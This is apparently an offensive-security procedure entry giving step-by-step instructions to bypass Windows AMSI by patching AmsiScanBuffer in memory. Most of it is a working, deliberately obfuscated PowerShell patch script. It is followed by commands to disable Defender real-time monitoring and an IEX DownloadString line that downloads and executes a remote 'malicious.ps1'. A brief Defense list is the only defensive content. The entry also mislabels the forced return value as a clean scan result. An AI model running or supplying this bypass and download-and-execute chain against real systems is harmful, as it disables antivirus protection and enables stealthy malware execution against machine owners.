---
id: 4320bb80-9024-49b4-96e0-53857d89ae70
name: AMSI-Bypass-via-Memory-Patch
type: procedure
verified: true
submitted: false
created_at: '2023-01-10T04:07:21.816219+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
platforms:
  - Windows
tags:
  - '[[tags/anti-malware]]'
  - '[[tags/Defense Bypass]]'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Disable or Modify Tools]]'
sub_techniques: []
commands: []
tools: []
validated: true
---

# AMSI-Bypass-via-Memory-Patch

## Summary

This procedure demonstrates a method to bypass the Windows Anti-Malware Scan Interface (AMSI) by patching the AmsiScanBuffer function in memory using PowerShell. AMSI is a feature that allows applications like PowerShell to scan scripts and content for malware before execution. By modifying the function to always return a clean result, subsequent malicious scripts can execute without triggering antivirus detection.

## Description

AMSI integrates with Windows components such as PowerShell, VBScript, and Office applications to perform real-time scanning of loaded content. This bypass technique uses reflection and P/Invoke to load the amsi.dll library, locate the AmsiScanBuffer function, change its memory protection to allow writes, and then overwrite its initial bytes with NOP-like instructions that force it to return AMSI_RESULT_CLEAN (0x80070057). This is effective on Windows 10 and Server 2016+ where AMSI is enabled by default. The technique is useful in post-exploitation scenarios to execute payloads that would otherwise be blocked, such as reverse shells or downloaders. Note that this is a runtime bypass and may not persist across reboots or process restarts.

## Requirements

1. Administrative privileges or a process with sufficient access to load libraries and modify memory (user-level may work if AMSI is loaded in the current process).
2. PowerShell 5.0 or later (AMSI integration starts here).
3. Windows 10 or Windows Server 2016+ with AMSI enabled (default in modern Windows).
4. No external tools required; uses built-in .NET and kernel32.dll.

## Defense

- Enable PowerShell logging (Module, ScriptBlock, and Transcription) to capture suspicious P/Invoke calls or memory modifications.
- Monitor for process injections or unusual VirtualProtect calls via EDR tools like Sysmon (Event ID 10 with protection changes to PAGE_EXECUTE_READWRITE).
- Use application whitelisting (AppLocker or WDAC) to restrict unsigned PowerShell scripts.
- Regularly update antivirus definitions and enable AMSI in all supported applications.
- Detect obfuscated strings or hex byte arrays in PowerShell execution via behavioral analysis.

## Objectives

1. Disable AMSI scanning in the current PowerShell session to allow execution of blocked content.
2. Verify the bypass by attempting to run a known malicious script that was previously blocked.
3. Maintain stealth by avoiding file drops or persistent changes.

## Instructions

### Step 1: Execute AMSI Patch Script

**Context**: This step loads the necessary Win32 APIs via P/Invoke, obfuscates the library and function names to evade static detection, locates the AmsiScanBuffer entry point, adjusts its memory protection, and patches the first six bytes to force a clean scan result. The obfuscation uses ASCII math tricks to hide strings like "amsi.dll" and "AmsiScanBuffer".

**Code** ([[codes/PowerShell-Patch-AMSI-ScanBuffer]]):

```powershell
$ierku = @"
using System;
using System.Runtime.InteropServices;
public class ierku {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr cdzyrg, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ierku

$ibaoqco = [ierku]::LoadLibrary("$([CHAr]([BYTe]0x61)+[chAR](109*83/83)+[cHAR](115)+[cHaR]([BytE]0x69)+[cHaR]([bYte]0x2e)+[chaR]([ByTe]0x64)+[chAr]([bYTe]0x6c)+[cHaR]([byTE]0x6c))")
$ckdbww = [ierku]::GetProcAddress($ibaoqco, "$([Char](65*46/46)+[ChAr]([byte]0x6d)+[chAr](115+55-55)+[cHar](105+72-72)+[CHaR](11+72)+[cHar]([bYTE]0x63)+[cHaR](97+33-33)+[ChAr]([bYTE]0x6e)+[cHAR](66+45-45)+[chAr](95+22)+[CHAR]([BYte]0x66)+[cHar](102*43/43)+[ChAR]([BYTe]0x65)+[char](114*91/91))")
$p = 0
[ierku]::VirtualProtect($ckdbww, [uint32]5, 0x40, [ref]$p)
$itid = "0xB8"
$jjjd = "0x57"
$byjw = "0x00"
$qiai = "0x07"
$iprq = "0x80"
$mumw = "0xC3"
$bdfxh = [Byte[]] ($itid,$jjjd,$byjw,$qiai,+$iprq,+$mumw)
[System.Runtime.InteropServices.Marshal]::Copy($bdfxh, 0, $ckdbww, 6)
```

> Run this script in a PowerShell session. If successful, there will be no output, and the patch is applied silently. To verify, attempt to execute a script containing malicious content (e.g., one that downloads and runs a payload) that AMSI would normally block.

### Step 2: Verify Bypass

**Context**: Test the bypass by running a known blocked command, such as setting a variable with obfuscated malicious content. If AMSI is bypassed, the command executes without the "ScriptContainedMaliciousContent" error.

**Instructions**: In the same PowerShell session, run a test like:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Or attempt to execute a simple malicious payload, such as:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
```

> If the bypass worked, the test executes without AMSI blocking it. If you see an error like "This script contains malicious content and has been blocked by your antivirus software," the bypass failed—try an alternative method or check prerequisites.

## Troubleshooting

If the patch fails due to access denied or the function not found, ensure AMSI is loaded (run `Get-Process -Name powershell | ForEach { & $_.Path }` in a new session). For the error "This script contains malicious content and has been blocked by your antivirus software. CategoryInfo: ParserError: (:) [], ParentContainsErrorRecordException FullyQualifiedErrorId : ScriptContainedMaliciousContent," this indicates AMSI is still active—re-run the patch or use a different bypass technique.
